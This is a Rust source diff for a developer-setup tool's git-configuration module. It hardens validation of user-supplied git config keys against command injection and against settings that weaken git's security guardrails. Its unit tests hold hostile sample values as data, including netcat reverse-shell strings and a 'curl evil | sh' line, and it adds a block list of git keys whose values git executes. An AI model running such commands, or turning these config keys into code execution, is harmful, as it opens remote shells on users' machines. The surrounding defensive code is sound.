@@ -7,6 +7,27 @@ use thiserror::Error;
 
 use super::config::{ConfigScope, GitConfig, SigningFormat};
 
+/// Parse a Jarvy boolean opt-in/opt-out environment variable. Accepts `1` /
+/// `true` / `yes` (case-insensitive) as enabled; everything else — including
+/// unset — is disabled. Single source of truth so every security opt-out
+/// (`JARVY_ALLOW_SHELL_ALIASES`, `JARVY_ALLOW_GIT_PROTECT_DOWNGRADE`,
+/// `JARVY_ALLOW_GIT_EXEC_KEYS`) accepts exactly the same spellings.
+fn env_flag_enabled(name: &str) -> bool {
+    std::env::var(name)
+        .map(|v| v == "1" || v.eq_ignore_ascii_case("true") || v.eq_ignore_ascii_case("yes"))
+        .unwrap_or(false)
+}
+
+/// Cross-platform recommended git defaults applied by `os_defaults` (not
+/// OS-specific, but sane for most repos and cheap to reverse).
+/// `merge.conflictStyle = zdiff3` needs git >= 2.35; older git ignores the
+/// unknown style at merge time rather than erroring on write.
+const RECOMMENDED_DEFAULTS: &[(&str, &str)] = &[
+    ("fetch.prune", "true"),           // drop refs deleted on the remote
+    ("rerere.enabled", "true"),        // reuse recorded conflict resolutions
+    ("merge.conflictStyle", "zdiff3"), // show the common base in conflicts
+];
+
 /// Errors that can occur during git configuration
 #[derive(Debug, Error)]
 pub enum GitError {
@@ -97,13 +118,14 @@ fn validate_extra_key(key: &str) -> Result<(), GitError> {
 ///   smuggling (NTFS 8.3 short-names, HFS+ ignorable code points). Default on.
 /// - `safe.directory = *` → disables repository-ownership verification wholesale
 ///   (CVE-2022-24765). A specific path is fine; the `*` wildcard is not.
-/// - `fsck.<msg-id> = ignore` → silences object-integrity validation. `warn` /
-///   `error` are allowed; `ignore` is the dangerous setting.
+/// - `safe.bareRepository = all` → re-enables embedded bare-repo attacks
+///   (git 2.38 hardening, CVE-2022-24765 sibling).
+/// - `fsck.<id>` / `fetch.fsck.<id>` / `receive.fsck.<id>` = `ignore`, or
+///   `transfer`/`fetch`/`receive.fsckObjects` = falsey → silences object-
+///   integrity validation. `warn` / `error` are allowed; `ignore`/off is the
+///   dangerous setting.
 fn check_not_protect_downgrade(key: &str, value: &str) -> Result<(), GitError> {
-    let allow = std::env::var("JARVY_ALLOW_GIT_PROTECT_DOWNGRADE")
-        .map(|v| v == "1" || v.eq_ignore_ascii_case("true") || v.eq_ignore_ascii_case("yes"))
-        .unwrap_or(false);
-    if allow {
+    if env_flag_enabled("JARVY_ALLOW_GIT_PROTECT_DOWNGRADE") {
         return Ok(());
     }
 
@@ -112,34 +134,62 @@ fn check_not_protect_downgrade(key: &str, value: &str) -> Result<(), GitError> {
         trimmed.to_ascii_lowercase().as_str(),
         "false" | "0" | "no" | "off" | ""
     );
+    let is_ignore = trimmed.eq_ignore_ascii_case("ignore");
     let key_lower = key.to_ascii_lowercase();
 
-    let refuse = |reason: &str| -> Result<(), GitError> {
-        tracing::warn!(
-            event = "git.config.refused_protect_downgrade",
-            key = %key,
-            "refused `[git.extra]` value that weakens a git security guardrail"
-        );
-        Err(GitError::RefusedDangerousConfig(
-            key.to_string(),
-            reason.to_string(),
-        ))
-    };
-
-    match key_lower.as_str() {
-        "core.protectntfs" | "core.protecthfs" if is_falsey => refuse(
+    // (guardrail label, human reason) when this (key, value) weakens a defense.
+    let violation: Option<(&'static str, &'static str)> = match key_lower.as_str() {
+        "core.protectntfs" | "core.protecthfs" if is_falsey => Some((
+            "protect_ntfs_hfs",
             "disabling core.protectNTFS/protectHFS re-opens `.git` path-smuggling attacks; \
              set JARVY_ALLOW_GIT_PROTECT_DOWNGRADE=1 to override",
-        ),
-        "safe.directory" if trimmed == "*" => refuse(
+        )),
+        "safe.directory" if trimmed == "*" => Some((
+            "safe_directory_wildcard",
             "`safe.directory = *` disables repo-ownership verification (CVE-2022-24765); \
              pin a specific path instead, or set JARVY_ALLOW_GIT_PROTECT_DOWNGRADE=1",
-        ),
-        _ if key_lower.starts_with("fsck.") && trimmed.eq_ignore_ascii_case("ignore") => refuse(
-            "setting an fsck.* check to `ignore` silences object-integrity validation; \
-             use `warn`/`error`, or set JARVY_ALLOW_GIT_PROTECT_DOWNGRADE=1",
-        ),
-        _ => Ok(()),
+        )),
+        // "safe.bareRepository".to_ascii_lowercase() == "safe.barerepository"
+        "safe.barerepository" if trimmed.eq_ignore_ascii_case("all") => Some((
+            "safe_bare_repository",
+            "`safe.bareRepository = all` re-enables embedded bare-repo attacks; \
+             set JARVY_ALLOW_GIT_PROTECT_DOWNGRADE=1 to override",
+        )),
+        "transfer.fsckobjects" | "fetch.fsckobjects" | "receive.fsckobjects" if is_falsey => {
+            Some((
+                "fsck_objects_disabled",
+                "disabling *.fsckObjects turns off object-integrity checking on transfer; \
+                 set JARVY_ALLOW_GIT_PROTECT_DOWNGRADE=1 to override",
+            ))
+        }
+        _ if is_ignore
+            && (key_lower.starts_with("fsck.")
+                || key_lower.starts_with("fetch.fsck.")
+                || key_lower.starts_with("receive.fsck.")) =>
+        {
+            Some((
+                "fsck_ignore",
+                "setting an fsck check to `ignore` silences object-integrity validation; \
+                 use `warn`/`error`, or set JARVY_ALLOW_GIT_PROTECT_DOWNGRADE=1",
+            ))
+        }
+        _ => None,
+    };
+
+    match violation {
+        Some((guardrail, reason)) => {
+            tracing::warn!(
+                event = "git_config.protect_downgrade_refused",
+                key = %key,
+                guardrail,
+                "refused `[git.extra]` value that weakens a git security guardrail"
+            );
+            Err(GitError::RefusedDangerousConfig(
+                key.to_string(),
+                reason.to_string(),
+            ))
+        }
+        None => Ok(()),
     }
 }
 
@@ -158,11 +208,65 @@ const GIT_SHELL_INTERPRETED_KEYS: &[&str] = &[
 /// Returns true if the given value would be executed as a shell command by
 /// git when stored under one of the shell-interpreted config keys.
 fn value_is_shell_escape(value: &str) -> bool {
-    // Git treats values starting with `!` as shell. Leading whitespace is
-    // not stripped by git, so `" !cmd"` is NOT a shell value — but the
-    // attacker has no reason to add leading whitespace, so reject the
-    // common form.
-    value.starts_with('!')
+    // Git treats values starting with `!` as shell. It also strips leading
+    // whitespace from config values on read, so `" !cmd"` is still a shell
+    // value — match after trimming to close that bypass.
+    value.trim_start().starts_with('!')
+}
+
+/// Git config keys whose VALUE git executes with no `!` marker required —
+/// either run through the shell verbatim (`core.pager`, `core.editor`,
+/// `core.sshCommand`, `sequence.editor`, `diff.external`) or invoked as a
+/// program / hook directory (`core.fsmonitor`, `core.hooksPath`,
+/// `credential.helper`, `gpg.program`). Because they need no marker character,
+/// the `!`-only filter does not catch them, so `[git.extra]` refuses these
+/// OUTRIGHT (any value) unless `JARVY_ALLOW_GIT_EXEC_KEYS=1`. Stored lowercase
+/// for case-insensitive matching. Wildcard families (`filter.<n>.clean`,
+/// `<n>.textconv`, `mergetool.<n>.cmd`, `gpg.<fmt>.program`) are handled in
+/// `is_exec_capable_key` since git allows arbitrary subsection names there.
+const EXEC_CAPABLE_KEYS: &[&str] = &[
+    "core.pager",
+    "core.editor",
+    "core.sshcommand",
+    "core.fsmonitor",
+    "core.hookspath",
+    "sequence.editor",
+    "diff.external",
+    "credential.helper",
+    "gpg.program",
+    "uploadpack.packobjectshook",
+];
+
+/// True if `key` (case-insensitively) names a git config entry whose value git
+/// will execute — either a fixed `EXEC_CAPABLE_KEYS` entry or a member of a
+/// wildcard family whose subsection is attacker-chosen.
+fn is_exec_capable_key(key: &str) -> bool {
+    let k = key.to_ascii_lowercase();
+    if EXEC_CAPABLE_KEYS.contains(&k.as_str()) {
+        return true;
+    }
+    // filter.<name>.{clean,smudge,process}
+    (k.starts_with("filter.")
+        && (k.ends_with(".clean") || k.ends_with(".smudge") || k.ends_with(".process")))
+        // diff.<name>.textconv (and any *.textconv driver)
+        || k.ends_with(".textconv")
+        // mergetool.<name>.cmd / difftool.<name>.cmd
+        || ((k.starts_with("mergetool.") || k.starts_with("difftool.")) && k.ends_with(".cmd"))
+        // gpg.<format>.program (e.g. gpg.ssh.program)
+        || (k.starts_with("gpg.") && k.ends_with(".program"))
+}
+
+/// A few exec-capable keys have a safe subset of values that should still be
+/// allowed via `[git.extra]`. `core.fsmonitor` is the notable case: `true` /
+/// `false` toggle git's *builtin* file-system monitor (no program run), while
+/// any other value is a program path git executes. Returns true only for those
+/// known-safe (key, value) combinations; everything else stays refused.
+fn exec_key_value_is_safe(key: &str, value: &str) -> bool {
+    let v = value.trim();
+    match key.to_ascii_lowercase().as_str() {
+        "core.fsmonitor" => v.eq_ignore_ascii_case("true") || v.eq_ignore_ascii_case("false"),
+        _ => false,
+    }
 }
 
 /// Git setup handler
@@ -247,37 +351,104 @@ impl GitSetup {
         Ok(())
     }
 
-    /// Apply free-form `[git.extra]` keys. Each key is validated for grammar /
-    /// flag-injection, then written through `set_config` (which still refuses
-    /// `!`-shell values). Iterate sorted so output ordering is deterministic.
+    /// Apply free-form `[git.extra]` keys. Each key runs a layered gauntlet
+    /// before it reaches `git config`: grammar/flag-injection validation, a
+    /// leading-`-` value check (argv option-injection), an outright refusal of
+    /// keys whose value git *executes* (`core.pager`, `core.sshCommand`, hook
+    /// paths, filter/textconv drivers, …), a security-guardrail-downgrade check,
+    /// and finally the `!`-shell-value refusal. Iterate sorted for deterministic
+    /// output.
     fn configure_extra(&self) -> Result<(), GitError> {
-        let mut keys: Vec<&String> = self.config.extra.keys().collect();
-        keys.sort();
-        for key in keys {
-            validate_extra_key(key)?;
-            let value = &self.config.extra[key];
-            // Refuse values that weaken a security guardrail (protectNTFS/HFS,
-            // safe.directory=*, fsck.*=ignore) before anything is written.
+        if self.config.extra.is_empty() {
+            return Ok(());
+        }
+        // Read the exec-key override once, not per key.
+        let allow_exec_keys = env_flag_enabled("JARVY_ALLOW_GIT_EXEC_KEYS");
+
+        let mut entries: Vec<(&String, &String)> = self.config.extra.iter().collect();
+        entries.sort_by(|a, b| a.0.cmp(b.0));
+
+        for (key, value) in &entries {
+            let key = key.as_str();
+            let value = value.as_str();
+
+            // 1. Key grammar / flag-injection (`--global`, `-f`, control bytes).
+            if let Err(e) = validate_extra_key(key) {
+                tracing::warn!(
+                    event = "git_config.refused_invalid_key",
+                    key = %key,
+                    "rejected `[git.extra]` key (grammar / flag-injection guard)"
+                );
+                return Err(e);
+            }
+            // 2. A value that starts with `-` is parsed by `git config` as an
+            //    option, not data (there is no clean `--` terminator here).
+            if value.starts_with('-') {
+                tracing::warn!(
+                    event = "git_config.refused_option_value",
+                    key = %key,
+                    "refused `[git.extra]` value starting with `-` (git would parse it as an option)"
+                );
+                return Err(GitError::RefusedDangerousConfig(
+                    key.to_string(),
+                    "values starting with `-` are parsed by git as an option, not data; \
+                     refusing to set this from `[git.extra]`"
+                        .to_string(),
+                ));
+            }
+            // 3. Keys whose value git executes with no marker (`core.sshCommand`,
+            //    `core.pager`, `core.hooksPath`, filter/textconv/… families).
+            //    These are the RCE sink the `!` filter alone cannot cover.
+            if is_exec_capable_key(key) && !exec_key_value_is_safe(key, value) && !allow_exec_keys {
+                tracing::warn!(
+                    event = "git_config.exec_key_refused",
+                    key = %key,
+                    "refused `[git.extra]` key whose value git executes (set JARVY_ALLOW_GIT_EXEC_KEYS=1 to allow)"
+                );
+                return Err(GitError::RefusedDangerousConfig(
+                    key.to_string(),
+                    "this git config key executes its value (shell command / program / hook path); \
+                     refusing to set it from `[git.extra]` — set JARVY_ALLOW_GIT_EXEC_KEYS=1 to override"
+                        .to_string(),
+                ));
+            }
+            // 4. Values that weaken a security guardrail (protectNTFS/HFS,
+            //    safe.directory=*, safe.bareRepository=all, fsck downgrades).
             check_not_protect_downgrade(key, value)?;
-            // `set_config` only refuses `!` for the narrow known-shell key list
-            // and aliases. Extra keys are free-form and many git keys
-            // (`core.fsmonitor`, `core.hooksPath`, mergetool/difftool cmds, …)
-            // execute `!`-values, so refuse the whole class here rather than
-            // chase an enumeration we can't keep complete.
+            // 5. `!`-shell values. Defense-in-depth: the exec-key list above
+            //    already blocks the shell keys, but this refuses the `!` form
+            //    for the historic shell keys reached via `set_config` too.
             if value_is_shell_escape(value) {
                 tracing::warn!(
-                    event = "git.config.refused_shell_escape",
+                    event = "git_config.shell_escape_refused",
                     key = %key,
                     "refused `[git.extra]` value starting with `!` (git would run it as a shell command)"
                 );
                 return Err(GitError::RefusedDangerousConfig(
-                    key.clone(),
+                    key.to_string(),
                     "values starting with `!` are interpreted by git as a shell command; \
                      refusing to set this from `[git.extra]` in jarvy.toml"
                         .to_string(),
                 ));
             }
             self.set_config(key, value)?;
+        }
+
+        // Adoption breadcrumb (gated). Section prefixes + count only — never
+        // values, and never full keys (a `branch.<name>.*` subsection can embed
+        // a branch name).
+        if crate::observability::telemetry_gate::is_enabled() {
+            let mut sections: Vec<&str> = entries
+                .iter()
+                .filter_map(|(k, _)| k.split('.').next())
+                .collect();
+            sections.sort_unstable();
+            sections.dedup();
+            tracing::info!(
+                event = "git_config.extra_applied",
+                key_count = entries.len(),
+                sections = %sections.join(","),
+            );
         }
         Ok(())
     }
@@ -361,79 +532,110 @@ impl GitSetup {
         }
     }
 
-    /// Apply OS-appropriate git config defaults for keys the user didn't set
-    /// explicitly. Mirrors the always-on per-OS `credential.helper` default:
-    /// host-aware values most repos want but rarely set by hand. Skipped
-    /// entirely when `os_defaults = false`. Every key here is guarded so a
-    /// typed field (checked before defaulting) or a `[git.extra]` entry
-    /// (applied afterward) always wins — we never overwrite an explicit value.
-    fn configure_os_defaults(&self) -> Result<(), GitError> {
+    /// The `(key, value)` git-config defaults this run would apply, in order,
+    /// given the current config and host OS — the pure DECISION, no I/O, so it
+    /// is unit-testable without shelling out to `git config`. Returns empty when
+    /// `os_defaults = false`. A key already present in `[git.extra]`, or (for
+    /// `core.autocrlf`) set as a typed field, is omitted so explicit values win.
+    pub(crate) fn os_default_plan(&self) -> Vec<(&'static str, &'static str)> {
         if !self.config.os_defaults.unwrap_or(true) {
-            return Ok(());
+            return Vec::new();
         }
+        let not_in_extra = |key: &str| !self.config.extra.contains_key(key);
+        let mut plan: Vec<(&'static str, &'static str)> = Vec::new();
 
-        // Line endings: only default when `autocrlf` is unset AND not steered
-        // via `[git.extra]` (which would just re-set it moments later).
-        if self.config.autocrlf.is_none() && !self.config.extra.contains_key("core.autocrlf") {
-            let value = Self::os_default_autocrlf();
-            tracing::debug!(
-                event = "git.config.os_default_applied",
-                key = "core.autocrlf",
-                value = %value,
-            );
-            self.set_config("core.autocrlf", value)?;
+        // Line endings: only when `autocrlf` is unset AND not steered via extra.
+        if self.config.autocrlf.is_none() && not_in_extra("core.autocrlf") {
+            plan.push(("core.autocrlf", Self::os_default_autocrlf()));
         }
-
-        // Windows: allow paths longer than the 260-char MAX_PATH limit. The key
-        // is inert on other platforms, so we scope it with cfg! to avoid noise.
+        // Windows: allow paths longer than the 260-char MAX_PATH limit.
         #[cfg(target_os = "windows")]
-        {
-            if !self.config.extra.contains_key("core.longpaths") {
-                tracing::debug!(
-                    event = "git.config.os_default_applied",
-                    key = "core.longpaths",
-                    value = "true",
-                );
-                self.set_config("core.longpaths", "true")?;
-            }
+        if not_in_extra("core.longpaths") {
+            plan.push(("core.longpaths", "true"));
         }
-
-        // macOS: APFS/HFS+ store filenames decomposed (NFD); recompose to NFC so
-        // filenames match those committed on Linux/Windows.
+        // macOS: recompose APFS/HFS+ NFD filenames to NFC for cross-platform matches.
         #[cfg(target_os = "macos")]
-        {
-            if !self.config.extra.contains_key("core.precomposeunicode") {
-                tracing::debug!(
-                    event = "git.config.os_default_applied",
-                    key = "core.precomposeunicode",
-                    value = "true",
-                );
-                self.set_config("core.precomposeunicode", "true")?;
+        if not_in_extra("core.precomposeunicode") {
+            plan.push(("core.precomposeunicode", "true"));
+        }
+        for (key, value) in RECOMMENDED_DEFAULTS {
+            if not_in_extra(key) {
+                plan.push((key, value));
             }
         }
+        plan
+    }
 
-        // Cross-platform recommended defaults — not OS-specific, but sane for
-        // most repos and cheap to reverse. Same opt-out (`os_defaults = false`)
-        // and same `[git.extra]`-wins override rule as the host-aware keys.
-        // `merge.conflictStyle = zdiff3` needs git >= 2.35; older git ignores
-        // the unknown style at merge time rather than erroring on write.
-        const RECOMMENDED_DEFAULTS: &[(&str, &str)] = &[
-            ("fetch.prune", "true"),           // drop refs deleted on the remote
-            ("rerere.enabled", "true"),        // reuse recorded conflict resolutions
-            ("merge.conflictStyle", "zdiff3"), // show the common base in conflicts
-        ];
-        for (key, value) in RECOMMENDED_DEFAULTS {
-            if !self.config.extra.contains_key(*key) {
+    /// Apply OS-appropriate git config defaults for keys the user didn't set
+    /// explicitly. Mirrors the always-on per-OS `credential.helper` default.
+    /// The decision lives in `os_default_plan`; this applies it, skipping keys
+    /// whose current value already matches (so idempotent re-runs don't re-fork
+    /// `git config`) and logging each key only *after* its write succeeds.
+    fn configure_os_defaults(&self) -> Result<(), GitError> {
+        let enabled = self.config.os_defaults.unwrap_or(true);
+        let plan = self.os_default_plan();
+
+        let mut written = 0usize;
+        if !plan.is_empty() {
+            // One read up front instead of an unconditional write per key.
+            let existing = self.existing_config();
+            for (key, value) in &plan {
+                // git lower-cases config keys in `--list`; compare accordingly.
+                if existing.get(&key.to_ascii_lowercase()).map(String::as_str) == Some(*value) {
+                    continue; // already set to the target — skip the fork
+                }
+                self.set_config(key, value)?;
                 tracing::debug!(
-                    event = "git.config.os_default_applied",
+                    event = "git_config.os_default_applied",
                     key = %key,
                     value = %value,
                 );
-                self.set_config(key, value)?;
+                written += 1;
             }
         }
 
+        if crate::observability::telemetry_gate::is_enabled() {
+            tracing::info!(
+                event = "git_config.os_defaults_applied",
+                enabled,
+                opted_out = !enabled,
+                keys_written = written,
+            );
+        }
         Ok(())
+    }
+
+    /// Snapshot the current git config for this scope as a `key -> value` map so
+    /// callers can skip redundant writes. Keys are git-lower-cased (as `git
+    /// config --list` emits them). Best-effort: any error yields an empty map,
+    /// so callers fall back to writing unconditionally (prior behavior).
+    fn existing_config(&self) -> std::collections::HashMap<String, String> {
+        let scope_flag = match self.config.scope {
+            ConfigScope::Global => "--global",
+            ConfigScope::Local => "--local",
+        };
+        let mut cmd = Command::new("git");
+        cmd.args(["config", scope_flag, "--list", "--null"]);
+        if let Some(ref dir) = self.project_dir {
+            cmd.current_dir(dir);
+        }
+        let Ok(output) = cmd.output() else {
+            return std::collections::HashMap::new();
+        };
+        if !output.status.success() {
+            return std::collections::HashMap::new();
+        }
+        // `--null` format: each entry is "key\nvalue", records NUL-separated.
+        String::from_utf8_lossy(&output.stdout)
+            .split('\0')
+            .filter(|s| !s.is_empty())
+            .filter_map(|record| {
+                let mut it = record.splitn(2, '\n');
+                let key = it.next()?;
+                let value = it.next().unwrap_or("");
+                Some((key.to_string(), value.to_string()))
+            })
+            .collect()
     }
 
     /// Configure line ending settings
@@ -478,7 +680,7 @@ impl GitSetup {
             let is_shell_key = GIT_SHELL_INTERPRETED_KEYS.contains(&key);
             if is_shell_key {
                 tracing::warn!(
-                    event = "git.config.refused_shell_escape",
+                    event = "git_config.shell_escape_refused",
                     key = %key,
                     "refused git config value starting with `!` for shell-interpreted key"
                 );
@@ -490,14 +692,10 @@ impl GitSetup {
                 ));
             }
             if is_alias {
-                let allow = std::env::var("JARVY_ALLOW_SHELL_ALIASES")
-                    .map(|v| {
-                        v == "1" || v.eq_ignore_ascii_case("true") || v.eq_ignore_ascii_case("yes")
-                    })
-                    .unwrap_or(false);
+                let allow = env_flag_enabled("JARVY_ALLOW_SHELL_ALIASES");
                 if !allow {
                     tracing::warn!(
-                        event = "git.config.refused_shell_alias",
+                        event = "git_config.shell_alias_refused",
                         alias = %key,
                         "refused git alias starting with `!` (set JARVY_ALLOW_SHELL_ALIASES=1 to allow)"
                     );
@@ -527,6 +725,12 @@ impl GitSetup {
 
         if !output.status.success() {
             let stderr = String::from_utf8_lossy(&output.stderr);
+            tracing::warn!(
+                event = "git_config.set_failed",
+                key = %key,
+                error = %stderr.trim(),
+                "git config write failed"
+            );
             return Err(GitError::ConfigFailed(key.to_string(), stderr.to_string()));
         }
 
@@ -592,11 +796,40 @@ pub fn signing_key_exists(key_path: &str) -> bool {
 mod tests {
     use super::*;
     use crate::git::config::AutoCrlf;
+    use std::sync::Mutex;
+
+    /// Serializes tests that mutate process-global env vars so they don't race,
+    /// and force the var to a known state (rather than sensing ambient state,
+    /// which yields "passes forever" no-ops when the var leaks in from CI).
+    static ENV_LOCK: Mutex<()> = Mutex::new(());
+
+    /// Run `f` with `key` forced to `value` (`None` = unset), restoring the
+    /// prior value afterward. Holds `ENV_LOCK` for the duration.
+    #[allow(unsafe_code)]
+    fn with_env<R>(key: &str, value: Option<&str>, f: impl FnOnce() -> R) -> R {
+        let _guard = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        let prev = std::env::var(key).ok();
+        // SAFETY: single-threaded within the ENV_LOCK critical section.
+        unsafe {
+            match value {
+                Some(v) => std::env::set_var(key, v),
+                None => std::env::remove_var(key),
+            }
+        }
+        let out = f();
+        // SAFETY: same lock still held; restore the prior state.
+        unsafe {
+            match prev {
+                Some(v) => std::env::set_var(key, v),
+                None => std::env::remove_var(key),
+            }
+        }
+        out
+    }
 
     #[test]
     fn test_default_credential_helper() {
         let helper = GitSetup::default_credential_helper();
-        // Should return a valid helper name
         assert!(!helper.is_empty());
     }
 
@@ -619,6 +852,29 @@ mod tests {
     }
 
     #[test]
+    fn env_flag_enabled_accepts_documented_spellings() {
+        for v in ["1", "true", "TRUE", "yes", "Yes"] {
+            with_env("JARVY_TEST_FLAG_X", Some(v), || {
+                assert!(env_flag_enabled("JARVY_TEST_FLAG_X"), "{v} should enable");
+            });
+        }
+        for v in ["0", "no", "off", "nope", ""] {
+            with_env("JARVY_TEST_FLAG_X", Some(v), || {
+                assert!(
+                    !env_flag_enabled("JARVY_TEST_FLAG_X"),
+                    "{v} should not enable"
+                );
+            });
+        }
+        with_env("JARVY_TEST_FLAG_X", None, || {
+            assert!(
+                !env_flag_enabled("JARVY_TEST_FLAG_X"),
+                "unset should not enable"
+            );
+        });
+    }
+
+    #[test]
     fn value_is_shell_escape_detects_bang_prefix() {
         assert!(value_is_shell_escape("!nc attacker 4444 -e /bin/sh"));
         assert!(value_is_shell_escape("!"));
@@ -627,12 +883,19 @@ mod tests {
         assert!(!value_is_shell_escape("checkout"));
     }
 
+    // Security F1 / QA F7: git strips leading whitespace from config values,
+    // so `" !cmd"` is still a shell value and must be caught.
+    #[test]
+    fn value_is_shell_escape_detects_leading_whitespace_bang() {
+        assert!(value_is_shell_escape(" !cmd"));
+        assert!(value_is_shell_escape("\t!cmd"));
+        assert!(value_is_shell_escape("   !curl evil | sh"));
+        assert!(!value_is_shell_escape("cmd !arg"));
+    }
+
     #[test]
     fn set_config_refuses_bang_credential_helper() {
-        // Build a setup that won't actually invoke git (we hit the refusal
-        // before the Command::output call).
-        let cfg = GitConfig::default();
-        let setup = GitSetup::new(cfg);
+        let setup = GitSetup::new(GitConfig::default());
         let err = setup
             .set_config("credential.helper", "!nc evil 4444 -e /bin/sh")
             .unwrap_err();
@@ -653,22 +916,15 @@ mod tests {
 
     #[test]
     fn set_config_refuses_bang_alias_without_env_opt_in() {
-        // Ensure env not set; this test is racy with parallel tests setting
-        // the same var, so we just refuse to assert if it happens to be set.
-        if std::env::var("JARVY_ALLOW_SHELL_ALIASES").is_ok() {
-            return;
-        }
-        let setup = GitSetup::new(GitConfig::default());
-        assert!(matches!(
-            setup.set_config("alias.x", "!curl evil | sh"),
-            Err(GitError::RefusedDangerousConfig(_, _))
-        ));
+        with_env("JARVY_ALLOW_SHELL_ALIASES", None, || {
+            let setup = GitSetup::new(GitConfig::default());
+            assert!(matches!(
+                setup.set_config("alias.x", "!curl evil | sh"),
+                Err(GitError::RefusedDangerousConfig(_, _))
+            ));
+        });
     }
 
-    /// Round-2 QA item 16: every entry in `GIT_SHELL_INTERPRETED_KEYS`
-    /// must refuse `!`-prefixed values. Loops over the constant so that
-    /// adding a new entry there gets coverage automatically — without
-    /// this, a future entry could regress to "no refusal" silently.
     #[test]
     fn every_shell_interpreted_key_refuses_bang_prefix() {
         let setup = GitSetup::new(GitConfig::default());
@@ -680,6 +936,8 @@ mod tests {
             }
         }
     }
+
+    // ---- validate_extra_key --------------------------------------------
 
     #[test]
     fn validate_extra_key_accepts_dotted_keys() {
@@ -713,6 +971,28 @@ mod tests {
         assert!(validate_extra_key("shell$.key").is_err());
     }
 
+    // QA F4: byte-length cap boundary.
+    #[test]
+    fn validate_extra_key_length_boundary() {
+        let mut k = "a.aa".repeat(64); // 256 bytes, valid charset, no `..`
+        assert_eq!(k.len(), 256);
+        assert!(validate_extra_key(&k).is_ok());
+        k.push('a'); // 257 bytes
+        assert!(matches!(
+            validate_extra_key(&k),
+            Err(GitError::InvalidConfigKey(_, _))
+        ));
+    }
+
+    // QA F9: non-ASCII / multibyte keys rejected by the byte-wise charset check.
+    #[test]
+    fn validate_extra_key_rejects_non_ascii() {
+        assert!(validate_extra_key("caf\u{e9}.key").is_err());
+        assert!(validate_extra_key("core.f\u{200b}oo").is_err()); // zero-width space
+    }
+
+    // ---- os_default_plan (pure decision, no git I/O) -------------------
+
     #[test]
     fn os_default_autocrlf_matches_host() {
         let expected = if cfg!(target_os = "windows") {
@@ -724,68 +1004,186 @@ mod tests {
     }
 
     #[test]
-    fn configure_os_defaults_opt_out_makes_no_git_calls() {
-        // os_defaults = false must early-return without shelling out to git,
-        // so this is safe to run without touching the real global config.
+    fn os_default_plan_disabled_is_empty() {
         let cfg = GitConfig {
             os_defaults: Some(false),
             ..GitConfig::default()
         };
-        let setup = GitSetup::new(cfg);
-        assert!(setup.configure_os_defaults().is_ok());
+        assert!(GitSetup::new(cfg).os_default_plan().is_empty());
     }
 
     #[test]
-    fn configure_extra_refuses_bang_value_for_arbitrary_key() {
-        // `core.fsmonitor` is NOT in GIT_SHELL_INTERPRETED_KEYS, but the
-        // escape-hatch path refuses `!`-values for every key.
+    fn os_default_plan_enabled_includes_recommended_and_autocrlf() {
+        // os_defaults = None → enabled.
+        let plan = GitSetup::new(GitConfig::default()).os_default_plan();
+        assert!(plan.iter().any(|(k, _)| *k == "fetch.prune"));
+        assert!(plan.iter().any(|(k, _)| *k == "rerere.enabled"));
+        assert!(
+            plan.iter()
+                .any(|(k, v)| *k == "merge.conflictStyle" && *v == "zdiff3")
+        );
+        assert!(plan.iter().any(|(k, _)| *k == "core.autocrlf"));
+    }
+
+    #[test]
+    fn os_default_plan_skips_autocrlf_when_typed_field_set() {
+        let cfg = GitConfig {
+            autocrlf: Some(AutoCrlf::False),
+            ..GitConfig::default()
+        };
+        let plan = GitSetup::new(cfg).os_default_plan();
+        assert!(!plan.iter().any(|(k, _)| *k == "core.autocrlf"));
+        assert!(plan.iter().any(|(k, _)| *k == "fetch.prune")); // others unaffected
+    }
+
+    #[test]
+    fn os_default_plan_skips_keys_present_in_extra() {
         let mut cfg = GitConfig::default();
         cfg.extra
-            .insert("core.fsmonitor".to_string(), "!evil.sh".to_string());
-        let setup = GitSetup::new(cfg);
+            .insert("fetch.prune".to_string(), "false".to_string());
+        cfg.extra
+            .insert("core.autocrlf".to_string(), "true".to_string());
+        let plan = GitSetup::new(cfg).os_default_plan();
+        assert!(!plan.iter().any(|(k, _)| *k == "fetch.prune"));
+        assert!(!plan.iter().any(|(k, _)| *k == "core.autocrlf"));
+        assert!(plan.iter().any(|(k, _)| *k == "rerere.enabled"));
+    }
+
+    // Security F1 QA F8: cfg-gated keys are verified on their native runner
+    // via the pure plan (no git shell-out), so they get coverage somewhere.
+    #[cfg(target_os = "macos")]
+    #[test]
+    fn os_default_plan_includes_precomposeunicode_on_macos() {
+        let plan = GitSetup::new(GitConfig::default()).os_default_plan();
+        assert!(
+            plan.iter()
+                .any(|(k, v)| *k == "core.precomposeunicode" && *v == "true")
+        );
+    }
+
+    #[cfg(target_os = "windows")]
+    #[test]
+    fn os_default_plan_includes_longpaths_on_windows() {
+        let plan = GitSetup::new(GitConfig::default()).os_default_plan();
+        assert!(
+            plan.iter()
+                .any(|(k, v)| *k == "core.longpaths" && *v == "true")
+        );
+    }
+
+    #[test]
+    fn configure_os_defaults_opt_out_makes_no_git_calls() {
+        // os_defaults = false → empty plan → no `git config` fork.
+        let cfg = GitConfig {
+            os_defaults: Some(false),
+            ..GitConfig::default()
+        };
+        assert!(GitSetup::new(cfg).configure_os_defaults().is_ok());
+    }
+
+    // ---- is_exec_capable_key + configure_extra RCE guards --------------
+
+    #[test]
+    fn is_exec_capable_key_matches_executed_keys() {
+        for k in [
+            "core.pager",
+            "core.sshCommand", // case-insensitive
+            "core.hooksPath",
+            "core.fsmonitor",
+            "sequence.editor",
+            "diff.external",
+            "credential.helper",
+            "filter.lfs.clean",
+            "filter.lfs.process",
+            "diff.mydriver.textconv",
+            "mergetool.mine.cmd",
+            "difftool.mine.cmd",
+            "gpg.ssh.program",
+            "uploadpack.packObjectsHook",
+        ] {
+            assert!(is_exec_capable_key(k), "{k} should be exec-capable");
+        }
+        for k in [
+            "core.autocrlf",
+            "fetch.prune",
+            "diff.colorMoved",
+            "filter.lfs.required",
+            "core.longpaths",
+        ] {
+            assert!(!is_exec_capable_key(k), "{k} should NOT be exec-capable");
+        }
+    }
+
+    // Security F1 (P0): exec-capable keys are refused OUTRIGHT (any value, no
+    // `!` needed) — the RCE the `!`-only filter missed.
+    #[test]
+    fn configure_extra_refuses_exec_capable_keys() {
+        with_env("JARVY_ALLOW_GIT_EXEC_KEYS", None, || {
+            for key in [
+                "core.pager",
+                "core.sshCommand",
+                "core.hooksPath",
+                "filter.lfs.clean",
+            ] {
+                let mut cfg = GitConfig::default();
+                cfg.extra
+                    .insert(key.to_string(), "totally-benign-looking".to_string());
+                assert!(
+                    matches!(
+                        GitSetup::new(cfg).configure_extra(),
